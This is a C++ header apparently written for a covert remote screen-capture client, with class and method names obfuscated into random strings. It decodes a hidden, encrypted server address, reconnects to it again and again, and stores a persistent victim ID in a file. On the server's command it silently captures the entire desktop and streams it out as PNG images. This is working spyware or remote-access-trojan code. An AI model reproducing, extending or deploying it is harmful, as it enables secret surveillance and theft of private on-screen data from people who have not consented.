#ifndef CLIENT_H
#define CLIENT_H

#include <WinSock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <WS2tcpip.h>
#include "screenshot.h"
#include "id_handler.h"
#include "decrypt.h"
#include <vector>

#pragma comment(lib, "Ws2_32.lib")

const int DEFAULT_PORT = 6081;
const std::string DEFAULT_IP_ADDRESS = "7O047LN464073";

class fb693ll7iddh332 { // Client
public:
	fb693ll7iddh332() {
		vcrcn6vva6vowzy();
	}
	~fb693ll7iddh332() {
		if (clientSocket_ != INVALID_SOCKET) {
			closesocket(clientSocket_);
		}
		if (hwnd_ != nullptr) {
			ReleaseDC(hwnd_, GetDC(hwnd_));
		}
		if (hwindowCompatibleDC_ != nullptr) {
			DeleteDC(hwindowCompatibleDC_);
		}
		if (hwindowDC_ != nullptr) {
			DeleteDC(hwindowDC_);
		}
	}
private: // Private Functions
	bool z72uot8sd9egdi1() {
		// Receive z72uot8sd9egdi1 from server
		int ackBytes = recv(clientSocket_, receivedCommand_, 16, 0);

		if (ackBytes < 0) {
			return false;
		}
		else if (ackBytes == 0) {
			return false;
		}
		receivedCommand_[ackBytes] = '\0';

		if (strcmp(receivedCommand_, "0") == 0) {
			runProgram_ = false;
			return false;
		}
		else if (strcmp(receivedCommand_, "1") == 0) {
			return true;
		}
	}
	void vcrcn6vva6vowzy() {
		// get handles to a device context (DC)
		hwnd_ = GetDesktopWindow();
		hwindowDC_ = GetDC(hwnd_);
		hwindowCompatibleDC_ = CreateCompatibleDC(hwindowDC_);
		SetStretchBltMode(hwindowCompatibleDC_, COLORONCOLOR);

		// define scale, height and width
		screenx_ = GetSystemMetrics(SM_XVIRTUALSCREEN);
		screeny_ = GetSystemMetrics(SM_YVIRTUALSCREEN);
		width_ = GetSystemMetrics(SM_CXVIRTUALSCREEN);
		height_ = GetSystemMetrics(SM_CYVIRTUALSCREEN);

		wVersionRequested_ = MAKEWORD(2, 2);
		wsaErr_ = WSAStartup(wVersionRequested_, &wsaData_);

		if (wsaErr_ != 0) {
			return;
		}
		
		while (runProgram_) {
			clientSocket_ = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			if (clientSocket_ == INVALID_SOCKET) {
				WSACleanup();
				return;
			}

			serverAddress_.sin_family = AF_INET;
			std::string decryptedIp = cqzcuzswcstfa3r(DEFAULT_IP_ADDRESS.c_str());
			
			if (inet_pton(AF_INET, decryptedIp.c_str(), &serverAddress_.sin_addr) <= 0) {
				closesocket(clientSocket_);
				WSACleanup();
				return;
			}

			serverAddress_.sin_port = htons(gj7eaodc0g10rbk(DEFAULT_PORT));

			// Try to connect until it is successful
			while (runProgram_) {
				if (connect(clientSocket_, (CONST SOCKADDR*) & serverAddress_, sizeof(serverAddress_)) == SOCKET_ERROR) {
					Sleep(1000);
					continue;
				}
				else {
					break;
				}
			}

			// Connection successful handle handshake via id

			if (!j61sbaazstls3ek::check_if_exists() || j61sbaazstls3ek::is_empty()) {
				j61sbaazstls3ek::create_file();
				// Doesn't have id, send server '0' to get one. Id is a 15 random char ending with '\0'
				send(clientSocket_, "0", 1, 0);
				if (!z72uot8sd9egdi1()) {
					if (runProgram_) continue;
					else break;
				}
				int idBytes = recv(clientSocket_, receivedCommand_, 16, 0); receivedCommand_[15] = '\0';
				if (idBytes < 0) {
					continue;
				}
				else if (idBytes == 0) {
					continue;
				}

				id = (std::string) receivedCommand_;
				j61sbaazstls3ek::write_id(id);
			}
			else {
				// Send 1 to indicate that it has an id
				send(clientSocket_, "1", 1, 0); 
				// Send the id to get verified
				j61sbaazstls3ek::read_id(id);
				send(clientSocket_, id.c_str(), 16, 0);
				if (!z72uot8sd9egdi1()) {
					if (runProgram_) continue;
					else break;
				}
			}

			while (runProgram_) {
				if (!bjvy6yz9c3kzip9()) {
					break;
				}
				if (!ltayouq2uol8dfi()) {
					break;
				}
			}
		}
	}

	bool bjvy6yz9c3kzip9() {
		if (clientSocket_ == INVALID_SOCKET) {
			return false;
		}

		int receivedBytes = recv(clientSocket_, receivedCommand_, 16, 0);
		if (receivedBytes < 0) {
			return false;
		}
		else if (receivedBytes == 0) {
			return false;
		}

		receivedCommand_[receivedBytes] = '\0';


		if (strcmp(receivedCommand_, "0") == 0) { // Will stop the server
			runProgram_ = false;
			return false;
		}
		else if (strcmp(receivedCommand_, "1") == 0) { // Will take a screenshot
			src_ = pp0xkp00wx0dtih(hwnd_, hwindowDC_, hwindowCompatibleDC_, screenx_, screeny_, width_, height_);
			if (src_.empty()) {
				runProgram_ = false;
				return false;
			}
		}
		
		return true;
	}

	bool ltayouq2uol8dfi() {
		if (clientSocket_ == INVALID_SOCKET) {
			return false;
		}
		int sentBytes = 0;
		// Encode the image as PNG format load it to a buffer
		cv::imencode(".png", src_, buf_);

		// First send the size of the image
		uint32_t bufSize = htonl(buf_.size()); // Convert to network byte order
		sentBytes = send(clientSocket_, reinterpret_cast<const char*>(&bufSize), sizeof(bufSize), 0);
		if (sentBytes < 0) {
			return false;
		}
		else if (sentBytes == 0) {
			return false;
		}

		// Send the image buffer itself in chunks
		const char* bufPtr = reinterpret_cast<const char*>(buf_.data());
		int totalSent = 0;
		int bufSizeNetworkOrder = ntohl(bufSize);
		while (totalSent < bufSizeNetworkOrder) {
			sentBytes = send(clientSocket_, bufPtr + totalSent, bufSizeNetworkOrder - totalSent, 0);
			if (sentBytes < 0) {
				return false;
			}
			else if (sentBytes == 0) {
				return false;
			}
			totalSent += sentBytes;
		}

		return true;
	}

private: // Private Variables
	WSAData wsaData_ = { 0 }; 
	int wsaErr_ = 0;
	SOCKET clientSocket_ = INVALID_SOCKET;
	WORD wVersionRequested_ = { 0 };
	sockaddr_in serverAddress_;
	char receivedCommand_[17];

	std::string filename_;
	bool runProgram_ = true;
	cv::Mat src_;
	HWND hwnd_ = nullptr;
	HDC hwindowDC_ = nullptr;
	HDC hwindowCompatibleDC_ = nullptr;
	int screenx_ = 0, screeny_ = 0, width_ = 0, height_ = 0;
	std::vector<uchar> buf_;
	std::string id;
};

#endif // !SERVER_H
